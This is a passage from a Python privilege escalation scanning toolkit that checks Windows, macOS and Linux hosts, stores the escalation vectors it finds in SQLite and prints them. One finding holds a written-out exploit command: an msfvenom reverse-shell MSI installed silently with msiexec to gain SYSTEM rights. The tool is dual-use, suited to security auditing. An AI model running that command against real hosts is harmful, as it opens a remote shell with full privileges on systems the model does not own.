                    technique=PrivescTechnique.WINDOWS_ALWAYS_INSTALL_ELEVATED,
                    severity=Severity.CRITICAL,
                    exploitability=Exploitability.EASY,
                    target_os=OperatingSystem.WINDOWS,
                    current_user=job.current_user,
                    target_privilege="SYSTEM",
                    vulnerability="AlwaysInstallElevated enabled",
                    description="MSI packages install with SYSTEM privileges",
                    exploit_command="msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=y -f msi -o shell.msi && msiexec /quiet /i shell.msi",
                    requirements=["AlwaysInstallElevated = 1"],
                    mitigation="Disable AlwaysInstallElevated in Group Policy",
                    confidence=95
                )
                job.vectors.append(vector)
        except Exception as e:
            logger.debug(f"Windows registry check failed: {e}")
    
    def _check_windows_scheduled_tasks(self, job: ScanJob):
        """Check Windows scheduled tasks"""
        if platform.system() != 'Windows':
            return
        
        # Implementation for Windows scheduled task analysis
        pass
    
    def _check_macos_tcc(self, job: ScanJob):
        """Check macOS TCC (Transparency, Consent, and Control) bypass"""
        if platform.system() != 'Darwin':
            return
        
        # TCC bypass checks
        pass
    
    def _check_macos_suid(self, job: ScanJob):
        """Check macOS SUID binaries"""
        if platform.system() != 'Darwin':
            return
        
        # Similar to Linux SUID check
        self._check_linux_suid(job)
    
    def _match_kernel_exploits(self, job: ScanJob):
        """Match system against kernel exploit database"""
        # Already done in OS-specific checks
        pass
    
    def _save_results(self, job: ScanJob):
        """Save scan results to database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO scan_jobs
                (job_id, target_os, current_user, scan_type, status, vector_count, started_at, completed_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                job.job_id,
                job.target_os.value,
                job.current_user,
                job.scan_type,
                job.status,
                len(job.vectors),
                job.started_at,
                job.completed_at
            ))
            
            for vector in job.vectors:
                conn.execute("""
                    INSERT INTO privesc_vectors
                    (job_id, technique, severity, exploitability, vulnerability, description, exploit_command, confidence, discovered_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    job.job_id,
                    vector.technique.value,
                    vector.severity.value,
                    vector.exploitability.value,
                    vector.vulnerability,
                    vector.description,
                    vector.exploit_command,
                    vector.confidence,
                    vector.discovered_at
                ))
            
            conn.commit()
    
    def get_job_status(self, job_id: str) -> Optional[Dict[str, Any]]:
        """Get job status"""
        job = self.jobs.get(job_id)
        if not job:
            return None
        
        return {
            "job_id": job.job_id,
            "target_os": job.target_os.value,
            "current_user": job.current_user,
            "status": job.status,
            "progress": job.progress,
            "vector_count": len(job.vectors),
            "kernel_exploit_count": len(job.kernel_exploits),
            "started_at": job.started_at,
            "completed_at": job.completed_at,
            "error_message": job.error_message
        }
    
    def get_job_results(self, job_id: str) -> Optional[Dict[str, Any]]:
        """Get job results"""
        job = self.jobs.get(job_id)
        if not job:
            return None
        
        return {
            "job_id": job.job_id,
            "target_os": job.target_os.value,
            "current_user": job.current_user,
            "status": job.status,
            "system_info": job.system_info,
            "vectors": [v.to_dict() for v in job.vectors],
            "kernel_exploits": [asdict(k) for k in job.kernel_exploits],
            "summary": {
                "total": len(job.vectors),
                "critical": sum(1 for v in job.vectors if v.severity == Severity.CRITICAL),
                "high": sum(1 for v in job.vectors if v.severity == Severity.HIGH),
                "medium": sum(1 for v in job.vectors if v.severity == Severity.MEDIUM),
                "low": sum(1 for v in job.vectors if v.severity == Severity.LOW),
            }
        }


# Singleton getter
def get_privesc_toolkit() -> PrivilegeEscalationToolkit:
    """Get Privilege Escalation Toolkit singleton instance"""
    return PrivilegeEscalationToolkit()


if __name__ == "__main__":
    import sys
    
    scan_type = sys.argv[1] if len(sys.argv) > 1 else "full"
    
    toolkit = get_privesc_toolkit()
    job_id = toolkit.start_scan(scan_type=scan_type)
    
    print(f"Started privilege escalation scan: {job_id}")
    print("Scanning...")
    
    import time
    while True:
        status = toolkit.get_job_status(job_id)
        if status:
            print(f"\rProgress: {status['progress']}% | Vectors: {status['vector_count']} [{status['status']}]", end="", flush=True)
            
            if status['status'] in ['completed', 'failed']:
                print()
                break
        
        time.sleep(2)
    
    results = toolkit.get_job_results(job_id)
    if results:
        print(f"\n{'='*80}")
        print(f"Privilege Escalation Scan Results")
        print(f"{'='*80}")
        print(f"OS: {results['target_os']} | User: {results['current_user']}")
        print(f"\nVectors Found: {results['summary']['total']}")
        print(f"  Critical: {results['summary']['critical']}")
        print(f"  High: {results['summary']['high']}")
        print(f"  Medium: {results['summary']['medium']}")
        print(f"  Low: {results['summary']['low']}")
        
        if results['vectors']:
            print(f"\n{'='*80}")
            print("Escalation Vectors:")
            for v in results['vectors']:
                print(f"\n  [{v['severity'].upper()}] {v['technique']}")
                print(f"  Vulnerability: {v['vulnerability']}")
                print(f"  Description: {v['description']}")
                print(f"  Exploit: {v['exploit_command']}")
